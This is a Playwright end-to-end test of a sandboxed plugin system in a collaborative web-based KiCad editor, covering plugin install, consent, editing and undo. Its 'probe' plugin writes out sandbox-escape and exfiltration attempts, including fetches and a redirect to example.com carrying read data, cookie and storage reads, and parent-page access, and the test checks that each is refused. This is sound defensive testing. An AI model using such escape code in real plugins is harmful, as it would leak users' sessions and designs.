// Browser test of web plugins: drives the real editor in Chromium, two people in one
// project.  Covers the manager (catalog, consent, enable, uninstall), every extension point
// (toolbar and menu actions, a docked panel, an exporter, an importer, check markers, an
// assistant tool), that a plugin's edit is an ordinary collaborative edit (it reaches the
// second person and is one undo step), and the sandbox: a plugin without a permission is
// refused, and one that tries to reach the page, the network or the session gets nowhere.
//
// Server: KC_DEV_LOGIN=1 KC_ADMINS=plug-out
//   E2E_PG_URL=… E2E_JWT_SECRET=… [SHOTS=/some/dir] node plugins-ui.mjs
//
import crypto from 'node:crypto';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { createRequire } from 'node:module';
import pg from 'pg';

const { chromium } = createRequire(import.meta.url)('playwright');

const BASE = (process.env.E2E_BASE || 'http://127.0.0.1:8099').replace(/\/$/, '');
const SECRET = process.env.E2E_JWT_SECRET, PG_URL = process.env.E2E_PG_URL;
const SHOTS = process.env.SHOTS || '';
if (!SECRET || !PG_URL) { console.error('E2E_JWT_SECRET and E2E_PG_URL are required.'); process.exit(2); }
if (SHOTS) fs.mkdirSync(SHOTS, { recursive: true });

let pass = 0, fail = 0;
const check = (name, ok, detail = '') => { console.log(`${ok ? 'PASS' : 'FAIL'}  ${name}${!ok && detail ? ' — ' + detail : ''}`); ok ? pass++ : fail++; };
const b64 = (o) => Buffer.from(JSON.stringify(o)).toString('base64url');
function mintJwt(sub, login) {
  const now = Math.floor(Date.now() / 1000);
  const head = b64({ alg: 'HS256', typ: 'JWT' }), body = b64({ sub, login, iat: now, exp: now + 3600 });
  return `${head}.${body}.${crypto.createHmac('sha256', SECRET).update(`${head}.${body}`).digest('base64url')}`;
}
pg.types.setTypeParser(20, (v) => parseInt(v, 10));
const db = new pg.Client({ connectionString: PG_URL, ssl: false });
await db.connect();
const post = (url, body) => fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body || {}) }).then((r) => r.json());

// ---------------------------------------------------------------- fixtures: the ECC83 demo, three people
const demo = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '../../demos/ecc83');
async function user(githubId, login) {
  return (await db.query(`INSERT INTO users (github_id, login, name) VALUES ($1, $2, $2)
    ON CONFLICT (github_id) DO UPDATE SET login = EXCLUDED.login RETURNING id`, [githubId, login])).rows[0].id;
}
const dana = await user(9401, 'plug-dana'), lee = await user(9402, 'plug-lee'), vic = await user(9403, 'plug-vic');
await db.query('DELETE FROM projects WHERE owner_id = $1', [dana]);
const out = await user(9404, 'plug-out');
await db.query('DELETE FROM plugins WHERE user_id = ANY($1)', [[dana, lee, vic]]);
await db.query('DELETE FROM plugin_registry WHERE owner_id = ANY($1)', [[dana, lee, vic, out]]);
await db.query('DELETE FROM ai_usage WHERE user_id = ANY($1)', [[dana, lee, vic]]);
const projectId = (await db.query(`INSERT INTO projects (owner_id, name) VALUES ($1, 'ecc83-pp') RETURNING id`, [dana])).rows[0].id;
await db.query(`INSERT INTO permissions (project_id, user_id, role, created_by) VALUES ($1, $2, 'editor', $3), ($1, $4, 'viewer', $3)`, [projectId, lee, dana, vic]);
const docs = {};
for (const [file, type] of [['ecc83-pp.kicad_sch', 'kicad_sch'], ['ecc83-pp.kicad_pcb', 'kicad_pcb'], ['ecc83-pp.kicad_pro', 'kicad_pro']]) {
  const id = (await db.query(`INSERT INTO documents (project_id, path, doc_type) VALUES ($1, $2, $3) RETURNING id`, [projectId, file, type])).rows[0].id;
  await db.query('INSERT INTO snapshots (doc_id, seq, content) VALUES ($1, 0, $2)', [id, fs.readFileSync(path.join(demo, file))]);
  docs[file] = id;
}

// Plugins written for this test, loaded through the manager's "Choose files…" like a developer would.
const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'kc-plugins-'));
function localPlugin(dir, manifest, main) {
  const d = path.join(tmp, dir); fs.mkdirSync(d, { recursive: true });
  fs.writeFileSync(path.join(d, 'plugin.json'), JSON.stringify(manifest)); fs.writeFileSync(path.join(d, 'main.js'), main);
  return [path.join(d, 'plugin.json'), path.join(d, 'main.js')];
}
const PROBE = 'test.probe';
const probeFiles = localPlugin('probe', {
  identifier: PROBE, name: 'Probe', description: 'Tries what a plugin must not be able to do.', version: '0.1.0', runtime: { type: 'web', entrypoint: 'main.js' },
  permissions: ['design:read'], actions: [{ identifier: 'probe', name: 'Probe', description: 'Run the probe', scopes: ['schematic', 'pcb'] }],
}, `
kicad.actions.register("probe", async () => {
  const r = {};
  const tryIt = async (name, fn) => { try { r[name] = "ALLOWED " + JSON.stringify(await fn()).slice(0, 80); } catch (e) { r[name] = "refused: " + (e.code || e.name) ; } };
  await tryIt("read", () => kicad.design.overview().then((o) => o.project));
  await tryIt("write", () => kicad.design.apply({ title: "x", edits: [{ op: "add_text", text: "pwned", x: 10, y: 10 }] }));
  await tryIt("commit", () => kicad.design.commit({ create: ['(text "pwned" (at 10 10 0))'] }));
  await tryIt("select", () => kicad.view.select({ refs: ["R1"] }));
  await tryIt("save", () => kicad.files.save({ filename: "x.txt", text: "x" }));
  await tryIt("pick", () => kicad.files.pick({}));
  await tryIt("fetch", () => fetch("${BASE}/api/me").then((x) => x.status));
  await tryIt("fetchExternal", () => fetch("https://example.com/?d=secret").then((x) => x.status));
  await tryIt("cookie", () => document.cookie || "(empty)");
  await tryIt("localStorage", () => localStorage.length);
  await tryIt("parentDom", () => parent.document.title);
  await tryIt("parentGlobals", () => Object.keys(parent.CollabEditor).length);
  await tryIt("topNav", () => { top.location = "https://example.com/"; return "navigated"; });
  await tryIt("popup", () => { const w = window.open("https://example.com/"); if (!w) throw new Error("blocked"); return "opened"; });
  await tryIt("image", () => new Promise((ok, no) => { const i = new Image(); i.onload = () => ok("loaded"); i.onerror = () => no(new Error("blocked")); i.src = "${BASE}/api/projects/${projectId}/preview.svg"; }));
  console.log("PROBE " + JSON.stringify(r));
  setTimeout(() => { location.href = "https://example.com/?leak=" + encodeURIComponent(r.read); }, 50);   // try to leave with what was read
});
`);
const WRITER = 'test.writer';
const writerFiles = localPlugin('writer', {
  identifier: WRITER, name: 'Writer', description: 'Creates, updates and removes an item with the raw commit API.', version: '0.1.0', runtime: { type: 'web', entrypoint: 'main.js' },
  permissions: ['design:read', 'design:write'], actions: [
    { identifier: 'create', name: 'Writer: create', description: 'c', scopes: ['schematic'] },
    { identifier: 'update', name: 'Writer: update', description: 'u', scopes: ['schematic'] },
    { identifier: 'remove', name: 'Writer: remove', description: 'r', scopes: ['schematic'] },
    { identifier: 'bad', name: 'Writer: bad', description: 'b', scopes: ['schematic'] },
    { identifier: 'flood', name: 'Writer: flood', description: 'f', scopes: ['schematic'] }],
}, `
let id = null;
const find = async () => (await kicad.design.items({ kinds: ["text"] })).items.find((t) => t.sexpr.includes("PLUGIN-NOTE"));
kicad.actions.register("create", async () => { const out = await kicad.design.commit({ label: "add note", create: ['(text "PLUGIN-NOTE one" (exclude_from_sim no) (at 50 40 0) (effects (font (size 1.27 1.27)) (justify left bottom)))'] }); id = out.created[0]; console.log("CREATED " + id); });
kicad.actions.register("update", async () => { const it = await find(); await kicad.design.commit({ label: "edit note", update: [{ id: it.id, sexpr: it.sexpr.replace("PLUGIN-NOTE one", "PLUGIN-NOTE two") }] }); console.log("UPDATED"); });
kicad.actions.register("remove", async () => { const it = await find(); await kicad.design.commit({ label: "drop note", remove: [it.id] }); console.log("REMOVED"); });
kicad.actions.register("bad", async () => {
  const r = {};
  for (const [k, a] of Object.entries({
    garbage: { create: ["(text \\"x\\" (at 1 1"] }, wrongKind: { create: ['(footprint "R" (at 1 1))'] }, two: { create: ['(text "a" (at 1 1 0)) (text "b" (at 2 2 0))'] },
    missing: { update: [{ id: "00000000-0000-0000-0000-000000000000", sexpr: '(text "a" (at 1 1 0))' }] }, removeMissing: { remove: ["nope"] }, empty: {} }))
    { try { await kicad.design.commit(a); r[k] = "ALLOWED"; } catch (e) { r[k] = e.code; } }
  console.log("BAD " + JSON.stringify(r));
});
kicad.actions.register("flood", async () => {
  let ok = 0, refused = 0;
  for (let i = 0; i < 40; i++) { try { await kicad.design.apply({ title: "flood", edits: [{ op: "add_text", text: "FLOOD" + i, x: 20 + i, y: 20 }] }); ok++; } catch (e) { if (e.code === "rate_limited") refused++; } }
  console.log("FLOOD " + JSON.stringify({ ok, refused }));
});
`);

// ---------------------------------------------------------------- browser
const browser = await chromium.launch();
const errors = [];
async function open(login, id, next) {
  const ctx = await browser.newContext({ viewport: { width: 1500, height: 900 }, deviceScaleFactor: SHOTS ? 2 : 1, colorScheme: 'light', acceptDownloads: true });
  const page = await ctx.newPage();
  page.on('pageerror', (e) => errors.push(`${login}: ${e}`));
  page.on('console', (m) => { if (m.type() === 'error' && !/favicon|fonts\.g|ERR_|40[0-9]|status of (4|5)|Content Security Policy|sandboxed|Unsafe attempt|Framing|Blocked|violates/.test(m.text())) errors.push(`${login}: ${m.text()}`); });
  await page.goto(`${BASE}/auth/dev?jwt=${mintJwt(id, login)}&next=${encodeURIComponent(next)}`);
  return page;
}
const shot = async (page, name) => { if (SHOTS) await page.screenshot({ path: path.join(SHOTS, `${name}.png`) }); };
const editorReady = async (page) => { await page.waitForFunction(() => window.CollabEditor && window.CollabEditor.api && window.CollabEditor.kdoc && window.KcPlugins, null, { timeout: 30000 }); await page.waitForTimeout(1200); };
const plug = (page) => page.evaluate(() => { const s = window.KcPlugins.store.get(); return { installed: s.installed.map((p) => ({ id: p.identifier, enabled: p.enabled, granted: p.granted })), running: s.running, logs: s.logs, panel: s.panel }; });
const logOf = async (page, id) => ((await plug(page)).logs[id] || []).map((l) => l.text);
const waitLog = (page, id, re, timeout = 10000) => page.waitForFunction(([i, src]) => (window.KcPlugins.store.get().logs[i] || []).some((l) => new RegExp(src).test(l.text)), [id, re.source], { timeout });
const running = (page, id) => page.waitForFunction((i) => { const r = window.KcPlugins.store.get().running[i]; return r && r.ready; }, id, { timeout: 10000 });
const frames = (page) => page.locator('#pluginFrames iframe').count();
/** Positions of the components of the open document, by reference. */
const places = (page) => page.evaluate(() => { const out = {}; for (const it of window.CollabEditor.kdoc.items.values()) if ((it.kind === 'symbol' || it.kind === 'footprint') && it.ref && !it.ref.startsWith('#')) out[it.ref] = [Math.round(it.x * 1e4) / 1e4, Math.round(it.y * 1e4) / 1e4, it.rot || 0]; return Object.fromEntries(Object.entries(out).sort((x, y) => x[0].localeCompare(y[0]))); });
const hasText = (page, text) => page.evaluate((t) => Array.from(window.CollabEditor.kdoc.items.values()).some((it) => it.kind === 'text' && JSON.stringify(it.node).includes(t)), text);
const diff = (x, y) => Object.keys(x).filter((r) => JSON.stringify(x[r]) !== JSON.stringify(y[r])).slice(0, 4).map((r) => `${r} ${JSON.stringify(x[r])}→${JSON.stringify(y[r])}`).join('; ');
const settled = (page, want) => page.waitForFunction((w) => { const out = {}; for (const it of window.CollabEditor.kdoc.items.values()) if ((it.kind === 'symbol' || it.kind === 'footprint') && it.ref && !it.ref.startsWith('#')) out[it.ref] = [Math.round(it.x * 1e4) / 1e4, Math.round(it.y * 1e4) / 1e4, it.rot || 0]; return JSON.stringify(Object.fromEntries(Object.entries(out).sort((x, y) => x[0].localeCompare(y[0])))) === w; }, JSON.stringify(want), { timeout: 8000 }).catch(() => {});
const undoDepth = (page) => page.evaluate(() => window.CollabApp.getState().undo.undo);
const menu = async (page, name, ...subs) => {
  await page.click(`#kmenus [data-menu="${name}"] > button`);
  for (const s of subs.slice(0, -1)) await page.locator(`#kmenus [data-menu="${name}"] [data-sub="${s}"]`).first().click();
  const last = subs[subs.length - 1];
  await page.locator(`#kmenus [data-menu="${name}"] [data-uiact="${last}"]`).first().click();
};
const closeMenus = async (page) => { for (let i = 0; i < 3 && (await page.locator('#kmenus .menu.open').count()); i++) { await page.keyboard.press('Escape'); await page.waitForTimeout(120); } };
const install = async (page, id) => {
  await page.click('#pluginManager [data-tab="catalog"]');
  await page.click(`#pluginCatalog [data-install="${id}"]`);
  await page.waitForSelector('#pluginConsent');
};
const installLocal = async (page, files, id) => {
  await page.click('#pluginManager [data-tab="develop"]');
  await page.setInputFiles('#pluginFiles', files);
  await page.waitForSelector('#pluginConsent');
  await page.click('#pluginConsentOk');
  await page.waitForFunction((i) => window.KcPlugins.store.get().installed.some((p) => p.identifier === i), id);
};
const accept = async (page, id) => { await page.click('#pluginConsentOk'); await page.waitForFunction((i) => window.KcPlugins.store.get().installed.some((p) => p.identifier === i), id); await running(page, id); };
const closeManager = (page) => page.click('#pluginManager .kd-x');
const ID = (n) => `dev.notaroomba.kicad-collab.${n}`;

const a = await open('plug-dana', dana, `/p/${projectId}/edit?doc=${docs['ecc83-pp.kicad_sch']}`);
await editorReady(a);

// ---- the manager and the catalog
check('page forbids frames from navigating', (await (await fetch(`${BASE}/p/${projectId}/edit`)).headers.get('content-security-policy')) === "frame-src 'none'");
check('no plugin runs before one is installed', (await frames(a)) === 0);
await menu(a, 'tools', 'External Plugins', 'pluginManager');
await a.waitForSelector('#pluginManager');
check('manager opens from Tools → External Plugins', await a.locator('#pluginManager').isVisible());
check('nothing installed yet', (await a.locator('#pluginManager .plg-empty').count()) === 1);
await a.click('#pluginManager [data-tab="catalog"]');
await a.waitForSelector('#pluginCatalog .plg-card');
check('catalog lists the built-in plugins', (await a.locator('#pluginCatalog .plg-card').count()) === 5);
await shot(a, '01-catalog');

// ---- consent, install, the toolbar button and an export
await install(a, ID('bom-export'));
const consent = await a.locator('#pluginConsent').innerText();
check('consent names the plugin and each permission', /Install BOM Export\?/.test(consent) && /Read your designs/.test(consent) && /Save files/.test(consent) && !/Change your designs/.test(consent));
check('nothing is stored before consent', (await plug(a)).installed.length === 0 && (await db.query('SELECT count(*)::int AS n FROM plugins WHERE user_id = $1', [dana])).rows[0].n === 0);
const sheetBox = await a.locator('#pluginConsent').boundingBox(), okBox = await a.locator('#pluginConsentOk').boundingBox(), dlgBox = await a.locator('#pluginManager').boundingBox();
check('the consent sheet is laid out in full', sheetBox.height > 250 && okBox.y + okBox.height <= dlgBox.y + dlgBox.height && dlgBox.y >= 0 && dlgBox.y + dlgBox.height <= 900, JSON.stringify({ sheetBox, okBox, dlgBox }));
await shot(a, '02-consent');
await accept(a, ID('bom-export'));
check('installed, enabled and running after consent', (await plug(a)).installed[0].enabled && (await frames(a)) === 1);
check('granted permissions are what was shown', JSON.stringify((await plug(a)).installed[0].granted) === JSON.stringify(['design:read', 'files:export']));
await shot(a, '03-installed');
await closeManager(a);
check('action button is on the top toolbar', await a.locator(`#tbTop [data-uiact="plugin:${ID('bom-export')}:export-bom"]`).isVisible());
let [dl] = await Promise.all([a.waitForEvent('download'), a.click(`#tbTop [data-uiact="plugin:${ID('bom-export')}:export-bom"]`)]);
let csv = fs.readFileSync(await dl.path(), 'utf8');
check('toolbar action saves a BOM', dl.suggestedFilename() === 'ecc83-pp-bom.csv' && /^Item,Qty,Reference\(s\),Value,Footprint\r\n/.test(csv) && /R1/.test(csv) && /ECC83/.test(csv), csv.slice(0, 200));
[dl] = await Promise.all([a.waitForEvent('download'), menu(a, 'file', 'Export', `plugin-export:${ID('bom-export')}:bom-csv`)]);
check('File → Export runs the exporter', dl.suggestedFilename() === 'ecc83-pp-bom.csv' && fs.readFileSync(await dl.path(), 'utf8') === csv);
await a.click('#kmenus [data-menu="file"] > button'); await a.waitForSelector('#kmenus [data-menu="file"] [data-sub="Export"]');
check('plugin exporters join KiCad\'s own Export submenu', (await a.locator('#kmenus [data-menu="file"] [data-sub="Export"]').count()) === 1);
await closeMenus(a);
await a.click('#kmenus [data-menu="tools"] > button');
await a.locator('#kmenus [data-menu="tools"] [data-sub="External Plugins"]').click();
await shot(a, '04-menu-and-toolbar');
await closeMenus(a);

// ---- a docked panel that follows the document and the selection
await menu(a, 'tools', 'External Plugins', 'pluginManager'); await a.waitForSelector('#pluginManager');
await install(a, ID('design-stats')); await accept(a, ID('design-stats')); await closeManager(a);
await a.keyboard.press('Control+Shift+I');
await a.waitForSelector('#dockPlugins:not(.closed)');
const panel = a.frameLocator(`#pluginFrames iframe[data-plugin="${ID('design-stats')}"]`);
await panel.locator('#counts b').first().waitFor({ timeout: 10000 });
check('hotkey opens the plugin panel', await a.locator('#dockPlugins').isVisible());
check('panel shows the open document', (await panel.locator('#title').innerText()).toLowerCase() === 'ecc83-pp.kicad_sch' && /Components/.test(await panel.locator('#counts').innerText()), `${await panel.locator('#title').innerText()} / ${(await panel.locator('#counts').innerText()).slice(0, 80)}`);
const r1 = await a.evaluate(() => Array.from(window.CollabEditor.kdoc.items.values()).find((it) => it.ref === 'R1').id);
await a.evaluate((id) => window.CollabEditor.api.toolCtx().setSelection([id]), r1);
await panel.locator('#sel tbody tr').first().waitFor();
check('panel follows the selection', /R1/.test(await panel.locator('#sel').innerText()) && /1 item selected/.test(await panel.locator('#selNote').innerText()));
check('panel is themed from the page', await panel.locator('body').evaluate((b) => getComputedStyle(b).backgroundColor) === await a.evaluate(() => { const d = document.createElement('div'); d.style.background = 'var(--paper)'; document.body.appendChild(d); const c = getComputedStyle(d).backgroundColor; d.remove(); return c; }));
await a.evaluate(() => window.CollabEditor.api.toolCtx().toast('A message while the dock is open', 4000)); await a.waitForSelector('#toast.show');
const barBox = await a.locator('#toast').boundingBox(), stageBox = await a.locator('#stage').boundingBox();
await a.evaluate(() => window.KcPlugins.runUi('pluginPanels')); await a.waitForTimeout(350);
const barBox2 = await a.locator('#toast').boundingBox(), stageBox2 = await a.locator('#stage').boundingBox();
await a.evaluate(() => window.KcPlugins.runUi('pluginPanels')); await a.waitForTimeout(350);
check('the editor infobar follows the canvas when the plugin dock opens or closes', Math.abs(barBox.width - stageBox.width) < 2 && Math.abs(barBox2.width - stageBox2.width) < 2 && Math.abs(stageBox.width - stageBox2.width) > 100, JSON.stringify({ barBox, stageBox, barBox2, stageBox2 }));
await shot(a, '05-panel');
await a.evaluate(() => { document.documentElement.dataset.theme = 'dark'; });
await a.waitForTimeout(400);
check('panel follows the dark theme', await panel.locator('html').getAttribute('data-theme') === 'dark');
await shot(a, '06-panel-dark');
await a.evaluate(() => { document.documentElement.dataset.theme = 'light'; });

// ---- a plugin edit is a collaborative edit: second person sees it, one undo reverts it
const b = await open('plug-lee', lee, `/p/${projectId}/edit?doc=${docs['ecc83-pp.kicad_sch']}`);
await editorReady(b);
check("the second person runs none of the first person's plugins", (await frames(b)) === 0 && (await plug(b)).installed.length === 0);
await menu(a, 'tools', 'External Plugins', 'pluginManager'); await a.waitForSelector('#pluginManager');
await install(a, ID('snap-to-grid'));
check('consent marks the write permission', /Change your designs/.test(await a.locator('#pluginConsent').innerText()) && (await a.locator('#pluginConsent [data-perm="design:write"].high').count()) === 1);
await accept(a, ID('snap-to-grid')); await closeManager(a);
await a.evaluate(() => window.CollabEditor.api.toolCtx().setSelection([]));
const before = await places(a); const depth0 = await undoDepth(a);
await a.click(`#tbTop [data-uiact="plugin:${ID('snap-to-grid')}:snap"]`);
await a.waitForSelector('#pluginPrompt');
check('the dialog is drawn by the editor and names the plugin', /plugin: Snap to Grid/.test(await a.locator('#pluginPrompt .kd-title').innerText()));
await a.selectOption('#pluginPrompt select', '2.54');
await shot(a, '07-prompt');
await a.click('#pluginPromptOk');
await waitLog(a, ID('snap-to-grid'), /Moved \d+ of/);
const after = await places(a);
const moved = Object.keys(before).filter((r) => before[r][0] !== after[r][0] || before[r][1] !== after[r][1]);
const onGrid = (v) => Math.abs(v / 2.54 - Math.round(v / 2.54)) < 1e-6;
check('snap moved components onto the grid', moved.length > 0 && Object.values(after).every((p) => onGrid(p[0]) && onGrid(p[1])), `${moved.length} moved`);
check('the whole snap is one undo step', (await undoDepth(a)) === depth0 + 1);
await b.waitForFunction(([ref, x, y]) => { const it = Array.from(window.CollabEditor.kdoc.items.values()).find((i) => i.ref === ref); return it && Math.abs(it.x - x) < 1e-3 && Math.abs(it.y - y) < 1e-3; }, [moved[0], after[moved[0]][0], after[moved[0]][1]], { timeout: 8000 }).catch(() => {});
check('the second person sees the plugin edit', JSON.stringify(await places(b)) === JSON.stringify(after));
await shot(a, '08-snapped'); await shot(b, '09-peer-sees-edit');
await a.evaluate(() => window.CollabEditor.api.undoLast());
await settled(a, before); await settled(b, before);
check('one undo reverts it for both people', JSON.stringify(await places(a)) === JSON.stringify(before) && JSON.stringify(await places(b)) === JSON.stringify(before), `a: ${diff(before, await places(a))} | b: ${diff(before, await places(b))}`);

// ---- the raw commit API: create, update, remove; malformed input; a write loop
await menu(a, 'tools', 'External Plugins', 'pluginManager'); await a.waitForSelector('#pluginManager');
await installLocal(a, writerFiles, WRITER); await running(a, WRITER); await closeManager(a);
const act = (page, id, action) => page.evaluate(([i, x]) => window.KcPlugins.runUi(`plugin:${i}:${x}`), [id, action]);
const allItems = async () => +(await panel.locator('#counts b').last().innerText());
const items0 = await allItems();
await act(a, WRITER, 'create'); await waitLog(a, WRITER, /^CREATED /);
await panel.locator('#counts b').last().filter({ hasText: String(items0 + 1) }).waitFor({ timeout: 5000 }).catch(() => {});
check('the panel updates when the design changes', (await allItems()) === items0 + 1, `${items0} → ${await allItems()}`);
await b.waitForFunction(() => Array.from(window.CollabEditor.kdoc.items.values()).some((it) => JSON.stringify(it.node).includes('PLUGIN-NOTE one')), null, { timeout: 8000 }).catch(() => {});
check('commit.create adds an item for both people', (await hasText(a, 'PLUGIN-NOTE one')) && (await hasText(b, 'PLUGIN-NOTE one')));
await act(a, WRITER, 'update'); await waitLog(a, WRITER, /^UPDATED/); await b.waitForTimeout(700);
check('commit.update replaces it in place', (await hasText(b, 'PLUGIN-NOTE two')) && !(await hasText(b, 'PLUGIN-NOTE one')));
await act(a, WRITER, 'remove'); await waitLog(a, WRITER, /^REMOVED/); await b.waitForTimeout(700);
check('commit.remove removes it', !(await hasText(a, 'PLUGIN-NOTE')) && !(await hasText(b, 'PLUGIN-NOTE')));
const count0 = await a.evaluate(() => window.CollabEditor.kdoc.items.size);
await act(a, WRITER, 'bad'); await waitLog(a, WRITER, /^BAD /);
const badRes = JSON.parse((await logOf(a, WRITER)).find((l) => l.startsWith('BAD ')).slice(4));
check('malformed commits are refused and change nothing', Object.values(badRes).every((v) => v !== 'ALLOWED') && badRes.wrongKind === 'invalid' && badRes.missing === 'not_found' && (await a.evaluate(() => window.CollabEditor.kdoc.items.size)) === count0, JSON.stringify(badRes));
await act(a, WRITER, 'flood'); await waitLog(a, WRITER, /^FLOOD /);
const flood = JSON.parse((await logOf(a, WRITER)).find((l) => l.startsWith('FLOOD ')).slice(6));
check('a write loop is cut off', flood.ok <= 30 && flood.refused >= 10, JSON.stringify(flood));
for (let i = 0; i < flood.ok; i++) await a.evaluate(() => window.CollabEditor.api.undoLast());
await a.waitForTimeout(600);
check('every plugin edit was undoable', !(await hasText(a, 'FLOOD')) && !(await hasText(b, 'FLOOD')));

// ---- the sandbox: a plugin with read access only
await menu(a, 'tools', 'External Plugins', 'pluginManager'); await a.waitForSelector('#pluginManager');
await installLocal(a, probeFiles, PROBE); await running(a, PROBE); await closeManager(a);
const net = []; a.on('request', (rq) => { if (/example\.com/.test(rq.url())) net.push(rq.url()); });
const countP = await a.evaluate(() => window.CollabEditor.kdoc.items.size);
await act(a, PROBE, 'probe'); await waitLog(a, PROBE, /^PROBE /, 20000).catch(() => {});
await a.waitForTimeout(800);
// files.pick opens a dialog only with the permission; without it the call is refused before any dialog
const probe = JSON.parse(((await logOf(a, PROBE)).find((l) => l.startsWith('PROBE ')) || 'PROBE {}').slice(6));
const refused = (k) => typeof probe[k] === 'string' && probe[k].startsWith('refused');
check('granted permission works', /^ALLOWED "ecc83-pp"/.test(probe.read || ''), probe.read);
check('ungranted API calls are refused', probe.write === 'refused: permission_denied' && probe.commit === 'refused: permission_denied' && probe.select === 'refused: permission_denied' && probe.save === 'refused: permission_denied' && probe.pick === 'refused: permission_denied', JSON.stringify(probe));
check('refused write changed nothing', (await a.evaluate(() => window.CollabEditor.kdoc.items.size)) === countP && !(await hasText(a, 'pwned')));
check('no network from the sandbox', refused('fetch') && refused('fetchExternal') && refused('image'), JSON.stringify(probe));
check('no cookies, storage or page access', refused('cookie') && refused('localStorage') && refused('parentDom') && refused('parentGlobals'), JSON.stringify(probe));
check('cannot navigate the tab, open windows or leave with data', refused('popup') && net.length === 0 && new URL(a.url()).origin === new URL(BASE).origin && (await a.locator('#stage').isVisible()), `${JSON.stringify(net)} ${a.url()}`);
check('the page is still alive after the probe', (await a.evaluate(() => window.CollabEditor.kdoc.items.size)) === countP);

// ---- a viewer's plugins cannot write
const v = await open('plug-vic', vic, `/p/${projectId}/edit?doc=${docs['ecc83-pp.kicad_sch']}`);
await editorReady(v);
await menu(v, 'tools', 'External Plugins', 'pluginManager'); await v.waitForSelector('#pluginManager');
await installLocal(v, writerFiles, WRITER); await running(v, WRITER); await closeManager(v);
await act(v, WRITER, 'create'); await v.waitForTimeout(1200);
check('a viewer with a write plugin still cannot write', !(await hasText(v, 'PLUGIN-NOTE')) && !(await hasText(a, 'PLUGIN-NOTE')) && (await logOf(v, WRITER)).some((l) => /view-only/.test(l)));
await v.close();

// ---- check markers, and a tool for the assistant
await menu(a, 'tools', 'External Plugins', 'pluginManager'); await a.waitForSelector('#pluginManager');
await install(a, ID('field-lint'));
check('consent lists the assistant tool', /Assistant tool: check_component_fields/.test(await a.locator('#pluginConsent').innerText()));
await accept(a, ID('field-lint')); await closeManager(a);
await menu(a, 'inspect', `plugin:${ID('field-lint')}:check`);
await a.waitForSelector('#pluginPrompt'); await a.check('#pluginPrompt input[type=checkbox]'); await a.click('#pluginPromptOk');
await a.waitForFunction(() => (window.CollabEditor.markers || []).length > 0, null, { timeout: 8000 }).catch(() => {});
const markers = await a.evaluate(() => window.CollabEditor.markers.map((m) => m.text));
check('the check places markers on the canvas', markers.length > 0 && markers.every((t) => /: no /.test(t)), markers.slice(0, 3).join(' | '));
await shot(a, '10-markers');

// ---- the board: export positions, edit them, import them back
await menu(a, 'tools', 'External Plugins', 'pluginManager'); await a.waitForSelector('#pluginManager');
await install(a, ID('placement')); await accept(a, ID('placement')); await closeManager(a);
await a.goto(`${BASE}/p/${projectId}/edit?doc=${docs['ecc83-pp.kicad_pcb']}`); await editorReady(a);
await b.goto(`${BASE}/p/${projectId}/edit?doc=${docs['ecc83-pp.kicad_pcb']}`); await editorReady(b);
await running(a, ID('placement'));
check('schematic-only entries stay off the board', (await a.locator(`#kmenus [data-uiact="plugin:${WRITER}:create"]`).count()) === 0);
[dl] = await Promise.all([a.waitForEvent('download'), menu(a, 'file', 'Export', `plugin-export:${ID('placement')}:placement-csv`)]);
const pos = fs.readFileSync(await dl.path(), 'utf8').trim().split('\r\n').map((l) => l.split(','));
const fpBefore = await places(a); const ref = pos[1][0];
check('placement export lists every footprint', pos[0].join(',') === 'Ref,Value,Footprint,X,Y,Rot,Side' && pos.length - 1 === Object.keys(fpBefore).length, `${pos.length - 1} rows`);
const nx = +(fpBefore[ref][0] + 5).toFixed(4), ny = +(fpBefore[ref][1] - 3).toFixed(4);
const edited = path.join(tmp, 'placement.csv');
fs.writeFileSync(edited, ['Ref;X;Y;Rot', `${ref};${nx};${ny};${fpBefore[ref][2]}`, 'ZZ99;1;1;0'].join('\n'));
const [chooser] = await Promise.all([a.waitForEvent('filechooser'), menu(a, 'file', 'Import', `plugin-import:${ID('placement')}:placement-csv`)]);
await chooser.setFiles(edited);
await a.waitForSelector('#pluginPrompt');
const ask = await a.locator('#pluginPrompt').innerText();
check('the importer asks before changing the board', /moves 1 of/.test(ask) && /ZZ99/.test(ask), ask.slice(0, 200));
await shot(a, '12-import-confirm');
await a.click('#pluginPromptOk');
await a.waitForFunction(([r, x]) => { const it = Array.from(window.CollabEditor.kdoc.items.values()).find((i) => i.ref === r); return it && Math.abs(it.x - x) < 1e-3; }, [ref, nx], { timeout: 8000 }).catch(() => {});
await b.waitForFunction(([r, x]) => { const it = Array.from(window.CollabEditor.kdoc.items.values()).find((i) => i.ref === r); return it && Math.abs(it.x - x) < 1e-3; }, [ref, nx], { timeout: 8000 }).catch(() => {});
const fpA = await places(a), fpB = await places(b);
check('the import moved the footprint for both people', fpA[ref][0] === nx && fpA[ref][1] === ny && fpB[ref][0] === nx && fpB[ref][1] === ny, `${JSON.stringify(fpA[ref])} ${JSON.stringify(fpB[ref])}`);
check('only that footprint moved', Object.keys(fpBefore).filter((r) => r !== ref).every((r) => JSON.stringify(fpA[r]) === JSON.stringify(fpBefore[r])));
await shot(a, '13-board-imported');
await a.evaluate(() => window.CollabEditor.api.undoLast()); await settled(a, fpBefore); await settled(b, fpBefore);
check('undo puts the footprint back for both', JSON.stringify(await places(a)) === JSON.stringify(fpBefore) && JSON.stringify(await places(b)) === JSON.stringify(fpBefore), `a: ${diff(fpBefore, await places(a))} | b: ${diff(fpBefore, await places(b))}`);

// ---- the server keeps the saved board as it was: plugin edits are ops, nothing else
// ---- disable, uninstall, and the store's own rules
await menu(a, 'tools', 'External Plugins', 'pluginManager'); await a.waitForSelector('#pluginManager');
await a.click(`#pluginList [data-plugin="${ID('bom-export')}"]`);
check('the manager shows the plugin log', /Ready/.test(await a.locator('#pluginLog').innerText()));
await shot(a, '14-manager-detail');
await a.uncheck('#pluginEnabled');
await a.waitForFunction((i) => !window.KcPlugins.store.get().running[i], ID('bom-export'));
check('a disabled plugin stops and its button goes', (await a.locator(`#tbTop [data-uiact="plugin:${ID('bom-export')}:export-bom"]`).count()) === 0 && (await a.locator(`#pluginFrames iframe[data-plugin="${ID('bom-export')}"]`).count()) === 0);
a.once('dialog', (d) => d.accept());
await a.click('#pluginUninstall');
await a.waitForFunction((i) => !window.KcPlugins.store.get().installed.some((p) => p.identifier === i), ID('bom-export'));
